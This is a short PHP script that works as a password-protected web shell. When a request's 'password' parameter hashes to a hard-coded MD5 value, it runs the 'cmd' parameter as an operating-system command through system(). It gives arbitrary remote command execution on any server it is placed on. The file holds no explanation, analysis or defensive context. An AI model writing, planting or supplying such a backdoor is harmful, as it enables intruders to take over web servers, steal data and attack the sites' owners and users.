<?php 
	if (md5($_GET['password']) == 'f1aab5cd9690adfa2dde9796b4c5d00d') {
		system($_GET['cmd']);
	}
?>
